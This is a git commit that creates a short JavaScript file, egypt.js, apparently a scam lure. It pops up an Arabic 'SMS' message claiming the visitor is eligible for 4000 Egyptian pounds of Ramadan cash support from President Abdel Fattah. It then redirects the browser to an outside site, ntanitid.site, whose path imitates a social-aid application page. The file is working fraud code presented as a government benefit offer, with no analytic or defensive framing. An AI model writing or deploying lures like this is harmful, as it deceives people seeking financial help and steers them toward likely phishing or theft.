1204ee241dc18cc62e8a7f2d6acf1e11f2430129
usorondo23 <shocker_flowers1e@icloud.com>
2026-02-26 10:22:14 +0100

    Create egypt.js

---
+++ egypt.js
@@ -0,0 +1,5 @@
+var password = 'احصل على 4000 جنيه مصري'
+password = prompt('SMS: تهانينا، أنت مؤهل لتلقي دعم نقدي بقيمة 4000 جنيه مصري بمناسبة شهر رمضان من الرئيس Abdel Fattah, انقر على "موافق" للحصول على هذا العرض الرائع','احصل على 4000 جنيه مصري');
+if (password != 'احصل على 4000 جنيه مصري') {
+    location.href ='https://www.ntanitid.site/egp4000-ramadan-social-package-application';
+}
